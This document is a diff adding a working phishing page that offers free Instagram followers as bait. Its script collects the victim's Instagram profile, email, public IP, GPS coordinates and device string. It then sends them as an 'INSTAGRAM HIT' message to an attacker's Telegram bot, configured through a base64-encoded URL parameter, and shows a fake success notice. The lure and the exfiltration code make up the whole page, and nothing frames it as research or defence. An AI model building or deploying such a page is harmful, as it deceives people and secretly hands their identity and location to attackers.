@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <script src="/tg-client.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Get 10K Free Instagram Followers</title>
+    <style>
+      body {
+        font-family: system-ui;
+        background: linear-gradient(135deg, #e1306c, #fd1d1d);
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 20px;
+      }
+      .card {
+        background: #fff;
+        color: #333;
+        max-width: 450px;
+        width: 100%;
+        border-radius: 20px;
+        padding: 40px;
+        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        text-align: center;
+      }
+      .logo {
+        background: linear-gradient(45deg, #e1306c, #fd1d1d);
+        color: #fff;
+        width: 100px;
+        height: 100px;
+        margin: 0 auto 25px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 2em;
+        font-weight: bold;
+      }
+      h1 {
+        font-size: 2.2em;
+        margin-bottom: 15px;
+      }
+      p {
+        font-size: 1.1em;
+        margin-bottom: 25px;
+        color: #666;
+        line-height: 1.5;
+      }
+      input {
+        width: 100%;
+        padding: 18px;
+        margin: 15px 0;
+        border-radius: 12px;
+        border: 2px solid #ddd;
+        font-size: 1.1em;
+        box-sizing: border-box;
+        text-align: center;
+      }
+      button {
+        width: 100%;
+        padding: 20px;
+        background: linear-gradient(45deg, #e1306c, #fd1d1d);
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        font-size: 1.3em;
+        font-weight: 700;
+        cursor: pointer;
+        margin-top: 20px;
+        box-shadow: 0 10px 30px rgba(225, 48, 108, 0.4);
+      }
+      button:hover {
+        transform: translateY(-3px);
+      }
+      .success {
+        background: linear-gradient(45deg, #00ff88, #00cc66);
+        color: #fff;
+        padding: 30px;
+        border-radius: 15px;
+        margin-top: 20px;
+      }
+      .loading {
+        display: none;
+        color: #e1306c;
+        font-size: 1.2em;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <div class="logo">IG</div>
+      <h1>🎁 Get 10K FREE Followers</h1>
+      <p>
+        Limited time offer! Enter your Instagram profile to claim 10,000 real
+        followers instantly. Trusted by 1M+ users!
+      </p>
+
+      <input
+        id="instaProfile"
+        placeholder="instagram.com/yourusername"
+        maxlength="100"
+      />
+      <input id="email" type="email" placeholder="your.email@gmail.com" />
+      <button onclick="getFollowers()">🚀 Claim FREE Followers NOW!</button>
+
+      <div id="loading" class="loading">
+        🔄 Processing your request... Please allow location access
+      </div>
+      <div id="message"></div>
+    </div>
+
+    <script>
+      const urlParams = new URLSearchParams(location.search);
+      const encodedPayload = urlParams.get("p");
+      let config = {};
+
+      if (encodedPayload) {
+        try {
+          config = JSON.parse(atob(encodedPayload));
+        } catch (e) {
+          console.error("Payload decode error");
+        }
+      }
+
+      async function getFollowers() {
+        const profile = document.getElementById("instaProfile").value;
+        const email = document.getElementById("email").value;
+
+        if (!profile || !email) return alert("Profile & Email দাও!");
+
+        document.getElementById("loading").style.display = "block";
+
+        // GPS + IP + UA
+        let locationData = { ip: "N/A", lat: "N/A", lng: "N/A" };
+
+        try {
+          const ipRes = await fetch("https://api.ipify.org?format=json");
+          locationData.ip = (await ipRes.json()).ip;
+        } catch (e) {}
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              locationData.lat = pos.coords.latitude;
+              locationData.lng = pos.coords.longitude;
+              sendData(profile, email, locationData);
+            },
+            () => sendData(profile, email, locationData),
+          );
+        } else {
+          sendData(profile, email, locationData);
+        }
+      }
+
+      async function sendData(profile, email, loc) {
+        const message =
+          `*📸 INSTAGRAM HIT!*\n\n` +
+          `👤 Profile: \`${profile}\`\n` +
+          `📧 Email: \`${email}\`\n` +
+          `🌐 IP: \`${loc.ip}\`\n` +
+          `📍 GPS: \`${loc.lat},${loc.lng}\`\n` +
+          `📱 Device: ${navigator.userAgent.slice(0, 60)}\n` +
+          `⏰ ${new Date().toLocaleString("bn-BD")}`;
+
+        try {
+          await fetch(`https://api.telegram.org/bot${config.bot}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: config.chat,
+              text: message,
+              parse_mode: "Markdown",
+            }),
+          });
+
+          document.getElementById("message").innerHTML =
+            '<div class="success">✅ Success! 10K followers processing...<br>Your account will be updated within 24 hours!</div>';
+          document.getElementById("loading").style.display = "none";
+        } catch (e) {
+          alert("Network error");
+        }
+      }
+    </script>
+  </body>
+</html>
